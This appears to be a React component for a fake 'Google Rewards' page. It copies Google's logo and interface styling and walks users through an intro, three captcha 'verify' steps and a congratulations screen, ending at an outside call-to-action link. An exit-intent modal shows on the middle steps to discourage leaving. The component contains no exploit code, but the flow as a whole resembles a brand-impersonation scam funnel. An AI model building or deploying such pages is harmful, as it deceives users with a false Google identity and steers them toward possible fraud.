"use client"

import { FlowProvider, useFlow } from "./flow-context"
import { FlowHeader } from "./flow-header"

import { ExitIntentModal } from "./exit-intent-modal"
import { StepIntro } from "./step-intro"
import { StepVerify } from "./step-verify"
import { StepVerify2 } from "./step-verify-2"
import { StepVerify3 } from "./step-verify-3"
import { StepCongrats } from "./step-congrats"
import { StepFinal } from "./step-final"

interface RewardsFlowProps {
  ctaUrl?: string
}

function FlowContent({ ctaUrl }: RewardsFlowProps) {
  const { currentStep } = useFlow()
  const isCongratsOrFinal = currentStep === 5 || currentStep === 6

  return (
    <div className="min-h-screen bg-[#f1f3f4] flex flex-col">
      {/* App top bar */}
      <div className="bg-white border-b border-[#dadce0] px-4 py-2.5 flex items-center gap-3 sticky top-0 z-40 shadow-[0_1px_3px_rgba(0,0,0,0.06)]">
        <svg viewBox="0 0 24 24" className="h-7 w-7 flex-shrink-0">
          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
        </svg>
        <span className="text-base font-medium text-[#202124]">Google Rewards</span>
        <div className="ml-auto flex items-center gap-2">
          <div className="w-8 h-8 rounded-full bg-[#4285f4] flex items-center justify-center">
            <span className="text-xs font-bold text-white">U</span>
          </div>
        </div>
      </div>

      <main className="flex flex-col w-full max-w-md mx-auto px-4 py-4 flex-1">
        {/* Only show balance header on captcha steps 2-4 */}
        {currentStep > 1 && currentStep < 5 && <FlowHeader />}

        <div className="animate-page-enter" key={currentStep}>
          {currentStep === 1 && <StepIntro />}
          {currentStep === 2 && <StepVerify />}
          {currentStep === 3 && <StepVerify2 />}
          {currentStep === 4 && <StepVerify3 />}
          {currentStep === 5 && <StepCongrats />}
          {currentStep === 6 && <StepFinal ctaUrl={ctaUrl} />}
        </div>

        {/* Exit intent modal - shows on steps 2-5 */}
        {currentStep >= 2 && currentStep <= 5 && <ExitIntentModal />}
      </main>

      {/* Bottom nav bar */}
      <div className="bg-white border-t border-[#dadce0] px-6 py-2 flex items-center justify-around sticky bottom-0 z-40">
        <div className="flex flex-col items-center gap-0.5">
          <svg className="w-5 h-5 text-[#4285f4]" fill="currentColor" viewBox="0 0 24 24">
            <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/>
          </svg>
          <span className="text-[10px] font-medium text-[#4285f4]">Home</span>
        </div>
        <div className="flex flex-col items-center gap-0.5">
          <svg className="w-5 h-5 text-[#5f6368]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
            <path strokeLinecap="round" strokeLinejoin="round" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
          </svg>
          <span className="text-[10px] font-medium text-[#5f6368]">Tasks</span>
        </div>
        <div className="flex flex-col items-center gap-0.5">
          <svg className="w-5 h-5 text-[#5f6368]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
            <path strokeLinecap="round" strokeLinejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
          </svg>
          <span className="text-[10px] font-medium text-[#5f6368]">Rewards</span>
        </div>
        <div className="flex flex-col items-center gap-0.5 relative">
          <svg className="w-5 h-5 text-[#5f6368]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
            <path strokeLinecap="round" strokeLinejoin="round" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" />
          </svg>
          <span className="text-[10px] font-medium text-[#5f6368]">Alerts</span>
          <div className="absolute -top-0.5 -right-1 w-2 h-2 bg-[#ea4335] rounded-full" />
        </div>
      </div>
    </div>
  )
}

export function RewardsFlow({ ctaUrl }: RewardsFlowProps) {
  return (
    <FlowProvider>
      <FlowContent ctaUrl={ctaUrl} />
    </FlowProvider>
  )
}
